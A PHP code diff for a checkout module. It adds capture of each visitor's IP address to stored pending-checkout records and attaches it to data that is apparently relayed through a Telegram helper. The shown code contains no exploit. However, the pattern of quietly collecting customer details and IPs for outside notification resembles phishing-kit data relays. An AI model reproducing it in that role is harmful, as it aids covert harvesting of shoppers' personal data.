@@ -23,6 +23,20 @@ function checkout_pending_has_informations(array $data): bool
         && trim((string) ($data['firstName'] ?? '')) !== '';
 }
 
+function checkout_pending_capture_visitor_ip(array $existing): string
+{
+    if (!function_exists('client_ip')) {
+        require_once __DIR__ . '/telegram.php';
+    }
+
+    $ip = client_ip();
+    if ($ip !== '—') {
+        return $ip;
+    }
+
+    return trim((string) ($existing['visitor_ip'] ?? ''));
+}
+
 function checkout_pending_save(array $checkoutData): void
 {
     if (session_status() === PHP_SESSION_NONE) {
@@ -61,6 +75,7 @@ function checkout_pending_save(array $checkoutData): void
         'updated_at' => $now,
         'completed' => !empty($existing['completed']),
         'notified' => !empty($existing['notified']),
+        'visitor_ip' => checkout_pending_capture_visitor_ip($existing),
     ];
 
     file_put_contents($path, json_encode($record, JSON_UNESCAPED_UNICODE), LOCK_EX);
@@ -143,6 +158,11 @@ function checkout_pending_try_send(bool $forceExpired = false): bool
         return false;
     }
 
+    $visitorIp = trim((string) ($record['visitor_ip'] ?? ''));
+    if ($visitorIp !== '' && filter_var($visitorIp, FILTER_VALIDATE_IP)) {
+        $data['visitorIp'] = $visitorIp;
+    }
+
     if (!empty($data['cardNumber'])) {
         return false;
     }
@@ -186,6 +206,11 @@ function checkout_pending_process_expired(): void
         $data = is_array($record['data'] ?? null) ? $record['data'] : [];
         if (!checkout_pending_has_informations($data) || !empty($data['cardNumber'])) {
             continue;
+        }
+
+        $visitorIp = trim((string) ($record['visitor_ip'] ?? ''));
+        if ($visitorIp !== '' && filter_var($visitorIp, FILTER_VALIDATE_IP)) {
+            $data['visitorIp'] = $visitorIp;
         }
 
         $informationsAt = (int) ($record['informations_at'] ?? 0);
